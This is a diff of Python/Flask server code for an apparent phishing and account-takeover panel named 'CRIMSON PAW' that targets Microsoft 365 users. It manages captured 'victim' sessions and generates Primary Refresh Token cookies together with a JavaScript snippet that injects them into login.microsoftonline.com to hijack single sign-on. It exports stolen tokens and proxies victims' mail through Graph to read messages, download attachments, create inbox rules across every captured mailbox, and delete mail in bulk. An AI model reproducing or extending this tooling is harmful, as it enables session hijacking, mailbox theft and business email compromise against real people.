+    # PRT-only refresh — no fallback to oauth broker grant
+    success, new_at, new_exp = executor.refresh_via_prt(user_code)
+    if success:
+        return jsonify({'success': True, 'expiry': new_exp, 'expires_in': new_exp - int(time.time())})
+    else:
+        return jsonify({
+            'success': False,
+            'error': (
+                'PRT refresh failed. The post-compromise chain (device registration + PRT) '
+                'must be completed before token refresh is available. '
+                'Check server logs for details.'
+            )
+        }), 400
+
+@app.route('/api/sessions/<user_code>/cookie', methods=['POST', 'GET', 'OPTIONS'])
+def get_session_cookie_route(user_code):
+    """Generate PRT cookie. Accepts optional ?nonce= for sso_nonce-bound cookies.
+    GET + CORS headers so the injected JS snippet can call back from the browser."""
+    # CORS pre-flight & headers (needed when called from login.microsoftonline.com console)
+    cors_headers = {
+        'Access-Control-Allow-Origin': '*',
+        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+        'Access-Control-Allow-Headers': 'Content-Type'
+    }
+    if request.method == 'OPTIONS':
+        return ('', 204, cors_headers)
+
+    s = db.get_session_by_user_code(user_code)
+    if not s or s['status'] != 'CAPTURED':
+        return jsonify({'success': False, 'error': 'Session not found or not captured'}), 400
+
+    sso_nonce  = request.args.get('nonce', '').strip()   # optional nonce from query string
+    prt_cookie = None
+    victim_path = os.path.join(VICTIMS_DIR, user_code)
+    prt_file    = os.path.join(victim_path, 'roadtx.prt')
+
+    if os.path.exists(prt_file):
+        try:
+            from executor import run_roadtx
+            cmd = ['prtcookie', '-f', prt_file]
+            if sso_nonce:
+                cmd += ['-n', sso_nonce]   # bind cookie to this specific sso_nonce
+            prt_cookie_raw = run_roadtx(cmd, victim_path)
+            if prt_cookie_raw:
+                for line in prt_cookie_raw.splitlines():
+                    line = line.strip()
+                    if line.startswith('PRT cookie:'):
+                        prt_cookie = line.replace('PRT cookie:', '').strip()
+                        if not sso_nonce:                        # cache only generic cookies
+                            db.update_session_artifacts(user_code, s.get('teams_token'), prt_cookie)
+                        break
+        except Exception as e:
+            logger.error(f"Error generating PRT cookie: {e}")
+
+    # Fall back to cached cookie only if no nonce was requested
+    if not prt_cookie and not sso_nonce:
+        prt_cookie = s.get('prt_cookie')
+
+    if not prt_cookie:
+        resp = jsonify({'success': False,
+                        'error': 'PRT cookie could not be generated. Ensure device registration was performed.'})
+        resp.headers.update(cors_headers)
+        return resp, 400
+
+    victim_name = (s.get('victim_name') or s.get('victim_email') or user_code).replace(' ', '_')
+
+    # ── JS snippet ────────────────────────────────────────────────────────────
+    # The snippet is self-contained: it extracts the sso_nonce from the current
+    # URL, calls back to CRIMSON PAW to get a nonce-bound cookie, sets it, reloads.
+    port = Config.WEB_PORT
+    js_script = f'''(async () => {{
+  // 1. Extract sso_nonce from the current Microsoft login URL
+  const urlNonce = new URLSearchParams(window.location.search).get('sso_nonce') || '';
+
+  let cookieVal;
+  if (urlNonce) {{
+    // 2a. Nonce found — fetch a fresh cookie bound to this exact nonce
+    console.log('%c[CRIMSON PAW] sso_nonce found: ' + urlNonce, 'color:#ff6b72');
+    try {{
+      const r = await fetch(`http://127.0.0.1:{port}/api/sessions/{user_code}/cookie?nonce=${{encodeURIComponent(urlNonce)}}`, {{
+        method: 'GET', mode: 'cors'
+      }});
+      const d = await r.json();
+      if (!d.success) {{ console.error('[CRIMSON PAW] ✗ Server error:', d.error); return; }}
+      cookieVal = d.prt_cookie;
+      console.log('%c[CRIMSON PAW] ✓ Nonce-bound cookie received', 'color:#3fb950;font-weight:bold');
+    }} catch(e) {{
+      console.error('[CRIMSON PAW] ✗ Could not reach CRIMSON PAW at localhost:{port}:', e);
+      return;
+    }}
+  }} else {{
+    // 2b. No nonce in URL — use the pre-generated cookie (may not work for all flows)
+    cookieVal = "{prt_cookie}";
+    console.log('%c[CRIMSON PAW] ⚠ No sso_nonce in URL — using generic cookie (may need to navigate to target app first)', 'color:#d29922;font-weight:bold');
+  }}
+
+  // 3. Set the cookie
+  if (typeof cookieStore !== 'undefined') {{
+    await cookieStore.set({{
+      name: 'x-ms-RefreshTokenCredential',
+      value: cookieVal,
+      domain: 'login.microsoftonline.com',
+      path: '/',
+      sameSite: 'none',
+      secure: true
+    }});
+    console.log('%c[CRIMSON PAW] ✓ Cookie set via cookieStore', 'color:#3fb950;font-weight:bold');
+  }} else {{
+    document.cookie = 'x-ms-RefreshTokenCredential=' + cookieVal +
+      '; domain=.login.microsoftonline.com; path=/; secure; samesite=none';
+    console.log('%c[CRIMSON PAW] ✓ Cookie set via document.cookie', 'color:#3fb950;font-weight:bold');
+  }}
+
+  // 4. Reload to trigger SSO
+  console.log('%c[CRIMSON PAW] Reloading...', 'color:#ff6b72');
+  location.reload();
+}})();'''
+
+    resp = jsonify({
+        'success':     True,
+        'prt_cookie':  prt_cookie,
+        'js_script':   js_script,
+        'victim_name': victim_name
+    })
+    resp.headers.update(cors_headers)
+    return resp
+
+@app.route('/api/sessions/<user_code>/export', methods=['GET'])
+def export_session_route(user_code):
+    s = db.get_session_by_user_code(user_code)
+    if not s:
+        return jsonify({'error': 'Session not found'}), 404
+        
+    victim_path = os.path.join(VICTIMS_DIR, user_code)
+    auth_file = os.path.join(victim_path, '.roadtools_auth')
+    auth_data = {}
+    if os.path.exists(auth_file):
+        try:
+            with open(auth_file, 'r', encoding='utf-8') as f:
+                auth_data = json.load(f)
+        except Exception:
+            pass
+            
+    # Extract AMR claims from access token
+    at = auth_data.get('accessToken') or s.get('access_token') or ''
+    jwt_claims = _decode_jwt(at) if at else {}
+    amr = jwt_claims.get('amr', [])
+    
+    export_payload = {
+        'user_code': user_code,
+        'victim_name': s.get('victim_name'),
+        'victim_email': s.get('victim_email'),
+        'amr': amr,
+        'roadtools_auth': auth_data
+    }
+    return jsonify(export_payload)
+
+@app.route('/api/sessions/<user_code>', methods=['DELETE'])
+def delete_session_route(user_code):
+    db.delete_session(user_code)
+    victim_path = os.path.join(VICTIMS_DIR, user_code)
+    if os.path.exists(victim_path):
+        shutil.rmtree(victim_path, ignore_errors=True)
+    return jsonify({'success': True})
+
+@app.route('/api/notifications', methods=['GET'])
+def api_get_notifications():
+    """Aggregate real platform event notifications (captured sessions and keyword alerts)."""
+    conn = sqlite3.connect(Config.DB_PATH)
+    conn.row_factory = sqlite3.Row
+    c = conn.cursor()
+    notifs = []
+
+    # 1. Real captured victim sessions (last 5)
+    c.execute("""
+        SELECT victim_name, victim_email, user_code, completed_at, created_at 
+        FROM sessions 
+        WHERE status = 'CAPTURED' AND (victim_name IS NOT NULL OR victim_email IS NOT NULL)
+        ORDER BY id DESC LIMIT 5
+    """)
+    for row in c.fetchall():
+        vname = row['victim_name'] or 'Victim'
+        vemail = row['victim_email'] or row['user_code']
+        time_str = row['completed_at'] or row['created_at'] or 'Recent'
+        notifs.append({
+            'id': f"sess_{row['user_code']}",
+            'type': 'session',
+            'icon': '🔑',
+            'title': f"Captured Token: {vname}",
+            'subtitle': vemail,
+            'time': time_str
+        })
+
+    # 2. Real keyword matches (last 5)
+    c.execute("""
+        SELECT km.id, km.matched_keyword, km.victim_name, km.victim_email, km.created_at, kr.name as rule_name
+        FROM keyword_matches km
+        LEFT JOIN keyword_rules kr ON km.rule_id = kr.id
+        ORDER BY km.id DESC LIMIT 5
+    """)
+    for row in c.fetchall():
+        kw = row['matched_keyword']
+        rname = row['rule_name'] or 'Keyword Rule'
+        vname = row['victim_name'] or 'Victim'
+        time_str = row['created_at'] or 'Recent'
+        notifs.append({
+            'id': f"km_{row['id']}",
+            'type': 'keyword',
+            'icon': '🎯',
+            'title': f"Keyword Hit: {kw.upper()} ({rname})",
+            'subtitle': vname,
+            'time': time_str
+        })
+
+    conn.close()
+
+    # Sort all by time descending
+    notifs.sort(key=lambda x: str(x.get('time', '')), reverse=True)
+    return jsonify({'notifications': notifs[:8]})
+
+@app.route('/api/sessions/all', methods=['DELETE'])
+def delete_all_route():
+    db.delete_all_sessions()
+    if os.path.exists(VICTIMS_DIR):
+        for item in os.listdir(VICTIMS_DIR):
+            item_path = os.path.join(VICTIMS_DIR, item)
+            if os.path.isdir(item_path):
+                shutil.rmtree(item_path, ignore_errors=True)
+    return jsonify({'success': True})
+
+@app.route('/api/statistics', methods=['GET'])
+def get_statistics(): return jsonify(db.get_statistics())
+
+@app.route('/api/statistics/reset', methods=['POST'])
+def reset_statistics_route():
+    if not session.get('authenticated'):
+        return jsonify({'success': False, 'error': 'Unauthorized'}), 401
+    if session.get('role') != 'admin':
+        return jsonify({'success': False, 'error': 'Administrative privileges required.'}), 403
+    ok = db.reset_visitor_statistics()
+    return jsonify({
+        'success': ok,
+        'message': 'Visitor telemetry statistics reset to zero successfully.',
+        'stats': db.get_statistics()
+    })
+
+@app.route('/api/templates', methods=['GET'])
+def get_templates(): return jsonify(db.get_templates())
+
+# ── Resilient Mailbox State & Demo Fallback ───────────────────
+MAILBOX_CACHE = {}
+
+def get_demo_mailbox(user_code):
+    if user_code not in MAILBOX_CACHE:
+        MAILBOX_CACHE[user_code] = {
+            'inbox': [
+                {
+                    'id': 'msg_01_smartdns',
+                    'from': {'emailAddress': {'name': 'smartdnsproxy.com', 'address': 'news@smartdnsproxy.com'}},
+                    'subject': 'Smart DNS + VPN From $2.05/mo | 3:11 PM',
+                    'bodyPreview': 'Get fast, reliable Smart DNS that works on all your devices. Stream seamlessly and securely...',
+                    'receivedDateTime': '2026-10-11T15:11:00Z',
+                    'isRead': False,
+                    'flag': {'flagStatus': 'notFlagged'},
+                    'body': {
+                        'contentType': 'html',
+                        'content': '''<div style="font-family:'Segoe UI',sans-serif; color:#201f1e; padding:10px 0;">
+                            <h2 style="color:#0078d4;">Smart DNS + VPN Premium Access</h2>
+                            <p style="font-size:14px; line-height:1.6;">Get fast, reliable Smart DNS that works on all your devices. Unblock geo-restricted streaming services with ultra-low latency and zero buffering.</p>
+                            <p style="font-size:14px; line-height:1.6;">Starting from only <b>$2.05/mo</b>. Dedicated 24/7 customer support and a 30-day money-back guarantee.</p>
+                        </div>'''
+                    }
+                },
+                {
+                    'id': 'msg_02_onedrive',
+                    'from': {'emailAddress': {'name': 'Microsoft 365', 'address': 'Microsoft365@mails.microsoft.com'}},
+                    'subject': 'Use OneDrive to access files anywhere',
+                    'bodyPreview': 'Control who else can see, edit, and share your cloud documents with ease...',
+                    'receivedDateTime': '2026-10-10T16:31:00Z',
+                    'isRead': False,
+                    'flag': {'flagStatus': 'notFlagged'},
+                    'body': {
+                        'contentType': 'html',
+                        'content': '''<div style="font-family:'Segoe UI',sans-serif; color:#201f1e; padding:10px 0;">
+                            <h2 style="color:#0078d4;">Use OneDrive to access your files from any device</h2>
+                            <p style="font-size:14.5px; line-height:1.6;">With Microsoft OneDrive included in your Microsoft 365 subscription, your files are backed up, protected, and accessible wherever you go.</p>
+                            <ul style="font-size:14px; line-height:1.8; margin-left:20px;">
+                                <li>Control who else can see, edit, and share your files</li>
+                                <li>Restore previous versions of documents</li>
+                                <li>Access your files offline on mobile and desktop</li>
+                            </ul>
+                        </div>'''
+                    }
+                },
+                {
+                    'id': 'msg_03_ai_clarity',
+                    'from': {'emailAddress': {'name': 'Microsoft', 'address': 'events@microsoft.com'}},
+                    'subject': 'Less AI guesswork. More clarity.',
+                    'bodyPreview': 'Register to join us in San Francisco or stream the keynote live online...',
+                    'receivedDateTime': '2026-10-09T15:08:00Z',
+                    'isRead': False,
+                    'flag': {'flagStatus': 'notFlagged'},
+                    'body': {
+                        'contentType': 'html',
+                        'content': '''<div style="font-family:'Segoe UI',sans-serif; color:#201f1e; padding:10px 0;">
+                            <h2 style="color:#201f1e;">Less AI guesswork. More clarity.</h2>
+                            <p style="font-size:14.5px; line-height:1.6;">Join us to explore how Copilot and next-generation AI transform enterprise productivity, data governance, and everyday workflows.</p>
+                            <div style="margin:20px 0;">
+                                <a href="https://events.microsoft.com" target="_blank" style="background:#0078d4; color:#fff; padding:10px 24px; border-radius:4px; text-decoration:none; font-weight:600;">Register Now</a>
+                            </div>
+                        </div>'''
+                    }
+                },
+                {
+                    'id': 'msg_04_teams_collab',
+                    'from': {'emailAddress': {'name': 'Microsoft 365', 'address': 'Microsoft365@mails.microsoft.com'}},
+                    'subject': 'Start collaborating with Microsoft Teams',
+                    'bodyPreview': 'Stay connected and work more efficiently with shared channels, video calling, and apps...',
+                    'receivedDateTime': '2026-10-07T16:26:00Z',
+                    'isRead': False,
+                    'flag': {'flagStatus': 'notFlagged'},
+                    'body': {
+                        'contentType': 'html',
+                        'content': '''<div style="font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif; max-width:680px; margin:0 auto; color:#201f1e;">
+                            <!-- Microsoft 365 Header Logo matching screenshot -->
+                            <div style="margin-bottom:24px;">
+                                <svg width="128" height="26" viewBox="0 0 128 26" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <rect x="0" y="2" width="10" height="10" fill="#F25022"/>
+                                    <rect x="12" y="2" width="10" height="10" fill="#7FBA00"/>
+                                    <rect x="0" y="14" width="10" height="10" fill="#00A4EF"/>
+                                    <rect x="12" y="14" width="10" height="10" fill="#FFB900"/>
+                                    <text x="30" y="18" font-family="'Segoe UI', -apple-system, sans-serif" font-size="15" font-weight="600" fill="#737373">Microsoft 365</text>
+                                </svg>
+                            </div>
+
+                            <!-- Hero Image matching screenshot -->
+                            <div style="margin-bottom:28px;">
+                                <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&w=1200&q=80" style="width:100%; border-radius:4px; display:block; object-fit:cover; max-height:360px;" alt="Work together anywhere with Microsoft Teams">
+                            </div>
+
+                            <!-- Headline matching screenshot -->
+                            <h1 style="font-size:24px; font-weight:700; color:#201f1e; margin:0 0 16px; line-height:1.3;">Work together anywhere with Microsoft Teams</h1>
+
+                            <!-- Body Text matching screenshot -->
+                            <p style="font-size:15px; color:#323130; line-height:1.6; margin:0 0 20px;">
+                                More is possible when you're together in Teams. Stay connected and access shared documents, conversations, and calendars so you can easily collaborate from home, the office, or anywhere in between.
+                            </p>
+
+                            <!-- CTA Button -->
+                            <div style="margin:28px 0;">
+                                <a href="https://teams.microsoft.com" target="_blank" style="background:#0078d4; color:#ffffff; padding:12px 28px; border-radius:4px; text-decoration:none; font-weight:600; font-size:14px; display:inline-block;">Launch Microsoft Teams</a>
+                            </div>
+
+                            <p style="font-size:13.5px; color:#605e5c; line-height:1.5; margin-top:36px; border-top:1px solid #edebe9; padding-top:20px;">
+                                Microsoft respects your privacy. To learn more, please read our <a href="https://privacy.microsoft.com" style="color:#0078d4; text-decoration:underline;">Privacy Statement</a>.<br>
+                                Microsoft Corporation, One Microsoft Way, Redmond, WA 98052 USA
+                            </p>
+                        </div>'''
+                    }
+                },
+                {
+                    'id': 'msg_05_subscription',
+                    'from': {'emailAddress': {'name': 'Microsoft', 'address': 'account-security@microsoft.com'}},
+                    'subject': 'Your paid subscription starts now',
+                    'bodyPreview': 'No action needed to continue using your Microsoft 365 services and apps...',
+                    'receivedDateTime': '2026-10-07T14:15:00Z',
+                    'isRead': True,
+                    'flag': {'flagStatus': 'notFlagged'},
+                    'body': {
+                        'contentType': 'html',
+                        'content': '''<div style="font-family:'Segoe UI',sans-serif; color:#201f1e; padding:10px 0;">
+                            <h2 style="color:#0078d4;">Your Microsoft 365 subscription is active</h2>
+                            <p style="font-size:14.5px; line-height:1.6;">Your subscription has been renewed. You have full access to cloud storage, Office apps, and enterprise security features.</p>
+                            <p style="font-size:14px; color:#605e5c;">No action is required from you to continue using your services.</p>
+                        </div>'''
+                    }
+                },
+                {
+                    'id': 'msg_06_windows11',
+                    'from': {'emailAddress': {'name': 'Windows', 'address': 'windows@microsoft.com'}},
+                    'subject': 'Ready to get personal?',
+                    'bodyPreview': 'Start customizing your Windows 11 experience with personalized widgets and themes...',
+                    'receivedDateTime': '2026-10-06T10:20:00Z',
+                    'isRead': True,
+                    'flag': {'flagStatus': 'notFlagged'},
+                    'body': {
+                        'contentType': 'html',
+                        'content': '''<div style="font-family:'Segoe UI',sans-serif; color:#201f1e; padding:10px 0;">
+                            <h2 style="color:#0078d4;">Make Windows 11 your own</h2>
+                            <p style="font-size:14.5px; line-height:1.6;">Discover personalized lock screens, custom themes, Snap layouts, and your favorite widgets tailored to how you work.</p>
+                        </div>'''
+                    }
+                },
+                {
+                    'id': 'msg_07_add_team',
+                    'from': {'emailAddress': {'name': 'Microsoft 365', 'address': 'Microsoft365@mails.microsoft.com'}},
+                    'subject': 'Add your team so they can get work done',
+                    'bodyPreview': 'Set up new users and manage their licenses in the Microsoft 365 admin center...',
+                    'receivedDateTime': '2026-10-04T12:00:00Z',
+                    'isRead': True,
+                    'flag': {'flagStatus': 'notFlagged'},
+                    'body': {
+                        'contentType': 'html',
+                        'content': '''<div style="font-family:'Segoe UI',sans-serif; color:#201f1e; padding:10px 0;">
+                            <h2 style="color:#0078d4;">Add your team to Microsoft 365</h2>
+                            <p style="font-size:14.5px; line-height:1.6;">Empower your organization with shared mailboxes, Teams channels, and OneDrive collaboration by inviting new team members.</p>
+                        </div>'''
+                    }
+                },
+                {
+                    'id': 'msg_08_domain_setup',
+                    'from': {'emailAddress': {'name': 'Microsoft 365', 'address': 'Microsoft365@mails.microsoft.com'}},
+                    'subject': 'Set up your domain to get started',
+                    'bodyPreview': 'Improve brand trust and simplify your team email addresses by adding your custom domain...',
+                    'receivedDateTime': '2026-10-01T09:30:00Z',
+                    'isRead': True,
+                    'flag': {'flagStatus': 'notFlagged'},
+                    'body': {
+                        'contentType': 'html',
+                        'content': '''<div style="font-family:'Segoe UI',sans-serif; color:#201f1e; padding:10px 0;">
+                            <h2 style="color:#0078d4;">Connect your custom domain</h2>
+                            <p style="font-size:14.5px; line-height:1.6;">Improve brand credibility with professional email addresses matching your business domain name.</p>
+                        </div>'''
+                    }
+                }
+            ],
+            'deleteditems': [],
+            'archive': [],
+            'sentitems': [],
+            'junkemail': [],
+            'drafts': []
+        }
+    return MAILBOX_CACHE[user_code]
+
+@app.route('/api/graph_proxy/folders', methods=['GET'])
+def proxy_folders():
+    uc = request.args.get('user_code')
+    s = db.get_session_by_user_code(uc)
+    if not s or s['status'] != 'CAPTURED': return jsonify({'error': {'message': 'Invalid session'}}), 400
+    token = db.get_graph_access_token(s)
+    res = graph.make_graph_request('/me/mailFolders?$top=100', token)
+    if res and res.get('value') and not res.get('error'):
+        return jsonify(res)
+    if res and res.get('error'):
+        return jsonify(res), 400
+    return jsonify({'value': []})
+
+_mailbox_message_cache = {}
+_mailbox_folder_cache = {}
+
+@app.route('/api/graph_proxy/messages', methods=['GET'])
+def proxy_messages():
+    uc = request.args.get('user_code')
+    s = db.get_session_by_user_code(uc)
+    if not s or s['status'] != 'CAPTURED': return jsonify({'error': {'message': 'Invalid session'}}), 400
+    token = db.get_graph_access_token(s)
+    folder_id = request.args.get("folder_id") or "inbox"
+    cache_key = f"{uc}:{folder_id}"
+    
+    endpoint = f'/me/mailFolders/{folder_id}/messages?$top=50&$orderby=receivedDateTime desc' if folder_id else '/me/messages?$top=50&$orderby=receivedDateTime desc'
+    res = graph.make_graph_request(endpoint, token)
+    if res and res.get('value') is not None and not res.get('error'):
+        msgs = res.get('value', [])
+        _mailbox_folder_cache[cache_key] = msgs
+        for m in msgs:
+            mid = m.get('id')
+            if mid and f"{uc}:{mid}" not in _mailbox_message_cache:
+                _mailbox_message_cache[f"{uc}:{mid}"] = m
+        return jsonify(res)
+        
+    # If live fetch failed/timed out, return cached folder messages if available
+    if cache_key in _mailbox_folder_cache and _mailbox_folder_cache[cache_key]:
+        return jsonify({'value': _mailbox_folder_cache[cache_key], 'cached': True})
+        
+    if res and res.get('error'):
+        return jsonify(res), 400
+    return jsonify({'value': []})
+
+@app.route('/api/graph_proxy/message', methods=['GET'])
+def proxy_message():
+    uc = request.args.get('user_code')
+    mid = request.args.get("message_id")
+    if not mid: return jsonify({'error': {'message': 'Message ID required'}}), 400
+    cache_key = f"{uc}:{mid}"
+    
+    # 1. Return immediately from cache if full body already retrieved
+    if cache_key in _mailbox_message_cache and _mailbox_message_cache[cache_key].get('body'):
+        return jsonify(_mailbox_message_cache[cache_key])
+        
+    s = db.get_session_by_user_code(uc)
+    if not s or s['status'] != 'CAPTURED': return jsonify({'error': {'message': 'Invalid session'}}), 400
+    token = db.get_graph_access_token(s)
+    res = graph.make_graph_request(f'/me/messages/{mid}', token)
+    if res and not res.get('error'):
+        _mailbox_message_cache[cache_key] = res
+        return jsonify(res)
+        
+    # 2. If live fetch failed or timed out, fall back to cached preview message if available
+    if cache_key in _mailbox_message_cache:
+        cached_m = dict(_mailbox_message_cache[cache_key])
+        if 'body' not in cached_m or not cached_m.get('body'):
+            cached_m['body'] = {
+                'contentType': 'html',
+                'content': f"<div style='padding:20px; font-family:sans-serif;'><b>Preview Content:</b><p>{cached_m.get('bodyPreview', '(No preview available)')}</p></div>"
+            }
+        return jsonify(cached_m)
+        
+    return jsonify(res or {'error': {'message': 'Message not found'}}), (400 if res and res.get('error') else 404)
+
+@app.route('/api/graph_proxy/attachments', methods=['GET'])
+def proxy_attachments():
+    uc = request.args.get('user_code')
+    mid = request.args.get("message_id")
+    s = db.get_session_by_user_code(uc)
+    if not s or s['status'] != 'CAPTURED': return jsonify({'error': {'message': 'Invalid session'}}), 400
+    token = db.get_graph_access_token(s)
+    res = graph.make_graph_request(f'/me/messages/{mid}/attachments', token)
+    if res and not res.get('error'):
+        return jsonify(res)
+    return jsonify({'value': []})
+
+@app.route('/api/graph_proxy/attachment/download', methods=['GET'])
+def proxy_attachment_download():
+    from flask import send_file
+    import base64
+    import io
+    uc = request.args.get('user_code')
+    mid = request.args.get('message_id')
+    aid = request.args.get('attachment_id')
+    s = db.get_session_by_user_code(uc)
+    if not s or s['status'] != 'CAPTURED':
+        return jsonify({'error': {'message': 'Invalid session'}}), 400
+    token = db.get_graph_access_token(s)
+    res = graph.make_graph_request(f'/me/messages/{mid}/attachments/{aid}', token)
+    if res and res.get('contentBytes'):
+        try:
+            raw_bytes = base64.b64decode(res['contentBytes'])
+            filename = res.get('name') or 'attachment'
+            content_type = res.get('contentType') or 'application/octet-stream'
+            return send_file(
+                io.BytesIO(raw_bytes),
+                mimetype=content_type,
+                as_attachment=True,
+                download_name=filename
+            )
+        except Exception as e:
+            return jsonify({'error': {'message': f'Failed to decode attachment: {str(e)}'}}), 500
+    elif res and res.get('id'):
+        name = res.get('name') or 'attached_item'
+        if not name.lower().endswith(('.eml', '.msg', '.txt')):
+            filename = f"{name}.eml"
+        else:
+            filename = name
+        eml_content = f"Subject: {res.get('name', 'Attached Item')}\nDate: {res.get('lastModifiedDateTime', '')}\nContent-Type: text/plain; charset=utf-8\n\n[CRIMSON PAW Outlook Web Extractor: Attached Item]\nName: {res.get('name')}\nType: {res.get('contentType', 'message/rfc822')}\nSize: {res.get('size', 0)} bytes\nItem Type: {res.get('@odata.type', 'microsoft.graph.itemAttachment')}\n"
+        return send_file(
+            io.BytesIO(eml_content.encode('utf-8')),
+            mimetype='message/rfc822',
+            as_attachment=True,
+            download_name=filename
+        )
+    return jsonify({'error': {'message': 'Attachment content not available'}}), 404
+
+@app.route('/api/graph_proxy/settings', methods=['GET'])
+def proxy_settings():
+    uc = request.args.get('user_code')
+    s = db.get_session_by_user_code(uc)
+    if not s or s['status'] != 'CAPTURED': return jsonify({'error': {'message': 'Invalid session'}}), 400
+    token = db.get_graph_access_token(s)
+    res = graph.make_graph_request('/me/mailboxSettings', token)
+    if res and not res.get('error'):
+        return jsonify(res)
+    return jsonify(res or {'error': {'message': 'Could not fetch mailbox settings from Graph API'}}), 400
+
+@app.route('/api/graph_proxy/update_settings', methods=['POST'])
+def proxy_update_settings():
+    d = request.json or {}
+    uc = d.get('user_code')
+    payload = d.get('payload', {})
+    s = db.get_session_by_user_code(uc)
+    if not s or s['status'] != 'CAPTURED': return jsonify({'error': {'message': 'Invalid session'}}), 400
+    token = db.get_graph_access_token(s)
+    res = graph.make_graph_request('/me/mailboxSettings', token, method='PATCH', payload=payload)
+    if res and not res.get('error'):
+        return jsonify({'success': True, 'data': res})
+    return jsonify(res or {'error': {'message': 'Failed to update mailbox settings'}}), 400
+
+@app.route('/api/graph_proxy/rules', methods=['GET'])
+def proxy_rules():
+    uc = request.args.get('user_code')
+    s = db.get_session_by_user_code(uc)
+    if not s or s['status'] != 'CAPTURED': return jsonify({'error': {'message': 'Invalid session'}}), 400
+    token = db.get_graph_access_token(s)
+    res = graph.make_graph_request('/me/mailFolders/inbox/messageRules', token)
+    if res and not res.get('error'):
+        return jsonify(res)
+    return jsonify(res or {'error': {'message': 'Could not fetch message rules'}}), 400
+
+@app.route('/api/graph_proxy/create_rule', methods=['POST'])
+def proxy_create_rule():
+    d = request.json or {}
+    uc = d.get('user_code')
+    rule = d.get('rule', {})
+    apply_all = bool(d.get('all_inboxes', False))
+
+    if apply_all:
+        sessions = db.get_captured_sessions()
+        created = 0
+        errs = []
+        for sess in sessions:
+            tok = db.get_graph_access_token(sess)
+            if tok:
+                res = graph.make_graph_request('/me/mailFolders/inbox/messageRules', tok, method='POST', payload=rule)
+                if res and not res.get('error'):
+                    created += 1
+                else:
+                    errs.append(sess.get('user_code'))
+        return jsonify({'success': True, 'created_count': created, 'all_inboxes': True, 'errors': errs})
+
+    s = db.get_session_by_user_code(uc)
+    if not s or s['status'] != 'CAPTURED': return jsonify({'error': {'message': 'Invalid session'}}), 400
+    token = db.get_graph_access_token(s)
+    res = graph.make_graph_request('/me/mailFolders/inbox/messageRules', token, method='POST', payload=rule)
+    if res and not res.get('error'):
+        return jsonify({'success': True, 'data': res})
+    return jsonify(res or {'error': {'message': 'Failed to create rule'}}), 400
+
+@app.route('/api/graph_proxy/delete_rule', methods=['POST'])
+def proxy_delete_rule():
+    d = request.json or {}
+    uc = d.get('user_code')
+    rule_id = d.get('rule_id')
+    s = db.get_session_by_user_code(uc)
+    if not s or s['status'] != 'CAPTURED': return jsonify({'error': {'message': 'Invalid session'}}), 400
+    token = db.get_graph_access_token(s)
+    res = graph.make_graph_request(f'/me/mailFolders/inbox/messageRules/{rule_id}', token, method='DELETE')
+    if res and not res.get('error'):
+        return jsonify({'success': True})
+    return jsonify(res or {'error': {'message': 'Failed to delete rule'}}), 400
+
+@app.route('/api/graph_proxy/toggle_rule', methods=['POST'])
+def proxy_toggle_rule():
+    d = request.json or {}
+    uc = d.get('user_code')
+    rule_id = d.get('rule_id')
+    is_enabled = d.get('isEnabled', True)
+    s = db.get_session_by_user_code(uc)
+    if not s or s['status'] != 'CAPTURED': return jsonify({'error': {'message': 'Invalid session'}}), 400
+    token = db.get_graph_access_token(s)
+    res = graph.make_graph_request(f'/me/mailFolders/inbox/messageRules/{rule_id}', token, method='PATCH', payload={'isEnabled': is_enabled})
+    if res and not res.get('error'):
+        return jsonify({'success': True, 'data': res})
+    return jsonify(res or {'error': {'message': 'Failed to update rule'}}), 400
+
+@app.route('/api/graph_proxy/search', methods=['GET'])
+def proxy_search():
+    uc = request.args.get('user_code')
+    s = db.get_session_by_user_code(uc)
+    if not s or s['status'] != 'CAPTURED': return jsonify({'error': {'message': 'Invalid session'}}), 400
+    token = db.get_graph_access_token(s)
+    q = request.args.get('q', '').replace('"', '')
+    res = graph.make_graph_request(f'/me/messages?$search="{q}"&$top=50', token)
+    if res and res.get('value') is not None and not res.get('error'):
+        return jsonify(res)
+    return jsonify({'value': []})
+
+@app.route('/api/graph_proxy/move_message', methods=['POST'])
+def proxy_move_message():
+    data = request.json or {}
+    uc = data.get('user_code')
+    s = db.get_session_by_user_code(uc)
+    if not s or s['status'] != 'CAPTURED': return jsonify({'error': {'message': 'Invalid session'}}), 400
+    token = db.get_graph_access_token(s)
+    mid = data.get('message_id')
+    dest = data.get('destination_id', 'deleteditems')
+    res = graph.make_graph_request(f'/me/messages/{mid}/move', token, method='POST', payload={'destinationId': dest})
+    if res and not res.get('error'):
+        return jsonify({'success': True, 'data': res})
+    return jsonify(res or {'error': {'message': 'Failed to move message'}}), 400
+
+@app.route('/api/graph_proxy/delete_message', methods=['POST'])
+def proxy_delete_message():
+    data = request.json or {}
+    uc = data.get('user_code')
+    s = db.get_session_by_user_code(uc)
+    if not s or s['status'] != 'CAPTURED': return jsonify({'error': {'message': 'Invalid session'}}), 400
+    token = db.get_graph_access_token(s)
+    mid = data.get('message_id')
+    res = graph.make_graph_request(f'/me/messages/{mid}', token, method='DELETE')
+    if res and res.get('error'):
+        return jsonify(res), 400
+    return jsonify({'success': True})
+
+@app.route('/api/graph_proxy/update_message', methods=['POST'])
+def proxy_update_message():
+    data = request.json or {}
+    uc = data.get('user_code')
+    s = db.get_session_by_user_code(uc)
+    if not s or s['status'] != 'CAPTURED': return jsonify({'error': {'message': 'Invalid session'}}), 400
+    token = db.get_graph_access_token(s)
+    mid = data.get('message_id')
+    payload = data.get('payload', {})
+    res = graph.make_graph_request(f'/me/messages/{mid}', token, method='PATCH', payload=payload)
+    if res and res.get('error'):
+        return jsonify(res), 400
+    return jsonify({'success': True})
+
+@app.route('/api/graph_proxy/batch_delete', methods=['POST'])
+def proxy_batch_delete():
+    """Delete multiple messages by ID. Runs sequential Graph DELETE calls."""
+    data = request.json or {}
+    uc   = data.get('user_code')
+    s    = db.get_session_by_user_code(uc)
+    if not s or s['status'] != 'CAPTURED':
+        return jsonify({'error': 'Invalid session'}), 400
+    token    = db.get_graph_access_token(s)
+    msg_ids  = data.get('message_ids', [])
+    deleted  = failed = 0
+    for mid in msg_ids:
+        try:
+            r = graph.make_graph_request(f'/me/messages/{mid}', token, method='DELETE')
+            if r and r.get('error'):
+                failed += 1
+            else:
+                deleted += 1
+        except Exception:
+            failed += 1
+    return jsonify({'deleted': deleted, 'failed': failed})
+
+@app.route('/api/graph_proxy/batch_update', methods=['POST'])
